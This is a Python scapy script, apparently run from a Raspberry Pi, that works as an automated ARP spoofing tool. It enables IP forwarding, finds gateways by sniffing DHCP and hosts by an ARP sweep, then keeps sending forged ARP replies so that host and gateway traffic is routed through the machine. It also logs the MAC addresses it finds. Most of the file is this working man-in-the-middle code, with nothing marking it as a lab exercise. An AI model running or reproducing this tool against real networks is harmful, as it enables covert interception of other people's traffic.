from __future__ import print_function
from scapy.all import *
import multiprocessing
import time
import math
import datetime
import json

__version__ = '0.0.3'
localiface='eth0'
Timeout=0.1

process=[]
maximo=2 #maximo número de host por thread
tiempo=40
check_time_max=8 # multiplo de tiempo secs, para comprobar si hay host en la red que no han realizado dhcp 
#y mirar que host siguen activos (still_up_host comprobacion por fichero) y que gateways (still_up_gateway comproabacion por arp)

#equipos en la red
GATEWAY=[]
HOST=[]

IDLE=[]

# Habilitar fowarding
def enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)



# Fixup function to extract dhcp_options by key
def get_option(dhcp_options, key):

    must_decode = ['hostname', 'domain', 'vendor_class_id']
    try:
        for i in dhcp_options:
            if i[0] == key:
                # If DHCP Server Returned multiple name servers 
                # return all as comma seperated string.
                if key == 'name_server' and len(i) > 2:
                    return ",".join(i[1:])
                # domain and hostname are binary strings,
                # decode to unicode string before returning
                elif key in must_decode:
                    return i[1].decode()
                else: 
                    return i[1]        
    except:
        pass


def handle_dhcp_packet(packet):

    # Match DHCP offer -> aporta la dirección ip del router de la red
    if DHCP in packet and packet[DHCP].options[0][1] == 2:
        router = get_option(packet[DHCP].options, 'router')

        if router not in GATEWAY:
          GATEWAY.append(router)
          #print ('gateway',GATEWAY)
          

    # Match DHCP ack -> aporta la dirección ip del router de la red
    elif DHCP in packet and packet[DHCP].options[0][1] == 5:
        router = get_option(packet[DHCP].options, 'router')
        
        if router not in GATEWAY:
          GATEWAY.append(router)
          #print ('ack -> gateway', GATEWAY)
        if router in HOST:
          HOST.remove(router)
    # Match DHCP nack -> aporta la dirección ip del router de la red
    elif DHCP in packet and packet[DHCP].options[0][1] == 6:
        router = packet[IP].src

        if router not in GATEWAY:
          GATEWAY.append(router)
          #print ('nack -> gateway', GATEWAY)
        if router in HOST:
          HOST.remove(router)
      
    # Match DHCP request --> host nuevos en la red
    elif DHCP in packet and packet[DHCP].options[0][1] == 3:
    
        requested_addr = get_option(packet[DHCP].options, 'requested_addr')
    
        if requested_addr not in HOST and requested_addr!=myip :
            HOST.append(requested_addr)
            #print('request -> hosts', HOST)
    return
  
#Arp discover para conocer que equipos estan up en la red  -> se ejecutara al inicio y cada cierto tiempo
def arp_discover():
    for i in range (1,254):
        dst_ip="192.168.1."+str(i)
        
        if dst_ip!=myip:
          arp_packet=Ether(dst="ff:ff:ff:ff:ff:ff")/\
                   ARP(op=1, psrc=myip, pdst=dst_ip)
          answered,unanswered=srp(arp_packet,timeout=Timeout,verbose=False,retry=5)
        
          if answered:    
            if dst_ip not in HOST and dst_ip not in GATEWAY:    
               HOST.append(dst_ip)
               #print ('hosts',HOST)
               
          elif unanswered and dst_ip in HOST:
            if not still_up_host(dst_ip):
              HOST.remove(dst_ip)
              IDLE.append(dst_ip)
            #print ('hosts',HOST)
            
          elif unanswered and dst_ip in IDLE:
            if not still_up_host(dst_ip):
              IDLE.remove(dst_ip)
            else:
              IDLE.remove(dst_ip)
              HOST.append(dst_ip)
              
            
          elif unanswered and dst_ip in GATEWAY:
            GATEWAY.remove(dst_ip)
            #print ('gateway',GATEWAY)

# Spoof
def get_mac(ip):
    answered, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),retry = 5, timeout=0.1, verbose=False)
    if answered:
        return answered[0][1].src
        
def spoof(host, gateway):
  self_mac = ARP().hwsrc
  #print ('hosts', host, 'gateway', gateway)

  gateway_mac=[]
  host_mac=[]
  
  for g in gateway:
    gateway_mac.append(get_mac(g))
  for h in host:
    host_mac.append(get_mac(h))
    
  while True:
    for g_mac in gateway_mac:
      for h_mac in host_mac: 
        arp_gateway = ARP(pdst=gateway[gateway_mac.index(g_mac)], hwdst=g_mac, psrc=host[host_mac.index(h_mac)], hwsrc=self_mac)
        arp_host = ARP(pdst=host[host_mac.index(h_mac)], hwdst=h_mac, psrc=gateway[gateway_mac.index(g_mac)], hwsrc=self_mac)
        send(arp_gateway, verbose=0)        
        send(arp_host, verbose=0)
        
        #print('[+] Sent to',gateway[gateway_mac.index(g_mac)],g_mac,':', host[host_mac.index(h_mac)], h_mac,'is -at',self_mac)
        #print('[+] Sent to ',host[host_mac.index(h_mac)],h_mac,':', gateway[gateway_mac.index(g_mac)],g_mac, 'is-at',self_mac)
    time.sleep(10)

def still_up_host(ip):
    
  # opening a text file
  file = open("/usr/local/zeek/logs/current/open_conn.log", "r")

  # setting flag and index to 0
  flag = 0
  index = 0

  # Loop through the file line by line
  for line in file:
    index =index+1
    # checking string is present in line or not
    if ip in line:
      flag = 1
      break

  # checking condition for string found or not
  if flag == 0:
    #print('String', ip , 'Not Found')
    return False
  else:
    #print('String', ip, 'Found In Line', index)
    return True

  # closing text file
  file.close()
        

if __name__ == "__main__":

  enable_linux_iproute()
  
  t=AsyncSniffer(filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
  t.start()
  
  #get my ip
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("8.8.8.8", 80))
  myip=s.getsockname()[0]
  s.close()
  
  dummy,localmacraw=get_if_raw_hwaddr('eth0')
  localmac=get_if_hwaddr('eth0')
  
  dhcp_request = Ether(src=localmac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=localmacraw,xid=RandInt())/DHCP(options=[("message-type","request"),("requested_addr",myip),"end"])
  #dhcp_request.display()
  dhcp_reply = srp(dhcp_request,iface='eth0',verbose=False,timeout=Timeout,retry=2)
  #enviamos un dhcp request con la dirección IP de la raspberry para que el router de la red responda con un dhcp ack
  #el cual lo analizaremos gracias a la llamada asíncrona de handl_dhcp_packet
  
  #primer descubrimiento de host activos en la red + proceso que lo ejecuta periodicamente
  arp_discover()
  check_time=0
 
  file_log="/home/pi/spoof_log/"+datetime.datetime.now().strftime("%Y_%m_%d-%H:%M:%S")+".log"
  

  #procesos segun cantidad de host
  Host_ant=[]
  Gateway_ant=[]
  try:
   while True:  
    h=len(HOST)
    #print (Host_ant!=HOST, 'different hosts', Host_ant, HOST)
    #print (Gateway_ant!=GATEWAY, 'different gateways', Gateway_ant, GATEWAY)
    gateway_mac=[]
    host_mac=[]
    for g in GATEWAY:
      gateway_mac.append(get_mac(g))
    for ho in HOST:
      host_mac.append(get_mac(ho))

    with open(file_log, "a") as f:
      data = {"Timestamp": datetime.datetime.now().strftime("%Y_%m_%d-%H:%M:%S"), "Gateway": gateway_mac, "Hosts": host_mac}
      json.dump(data, f)
      f.write("\n")
    f.close()

    if Host_ant!=HOST or Gateway_ant!=GATEWAY:
     #print ('new processes')
     if bool(process):
         for p in process:
           p.terminate()
           #print ('termintate process',  process.index(p))
         process.clear()		
     if h<=maximo:
          p=multiprocessing.Process(target=spoof, args=(HOST,GATEWAY,))
          process.append(p)
          p.start()
          #print ('start unique process')
     else:
          j=math.ceil(len(HOST)/maximo)
          #print ('groups',j)
          for i in range(0,j):
            if i==j:
              p=multiprocessing.Process(target=spoof, args=(HOST[(maximo*i):], GATEWAY,))
            else:
              p=multiprocessing.Process(target=spoof, args=(HOST[(maximo*i):(maximo*(i+1))], GATEWAY,))
            process.append(p)
            p.start()
            #print ('start process',i)
     for h in HOST:
      if h not in Host_ant:
       Host_ant.append(h)
     for h in Host_ant:
       if h not in HOST:
        Host_ant.remove(h)
     for g in GATEWAY:
      if g not in Gateway_ant: 
       Gateway_ant.append(g)
     for g in Gateway_ant:
       if g not in GATEWAY:
        Gateway_ant.remove(g)  
        
    for i in IDLE:
        arp_packet=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=myip, pdst=i)
        answered,unanswered=srp(arp_packet,timeout=Timeout,verbose=False,retry=5)
        if answered:
            HOST.append(i)
            IDLE.remove(i)
            
    #print ('wait for check')
    time.sleep(tiempo)
    #print ('check') 
    #print (HOST)
    if check_time==check_time_max:
     arp_discover()
     check_time=0
     #print ('check') 
     #print (HOST)
    else:
     check_time=check_time+1

  except KeyboardInterrupt:
        #print("[!] Detected CTRL+C ! restoring the network, please wait...")
        for i in range(0,len(process)):
           process[i].terminate()
           #print ('termintate process',  i)
     

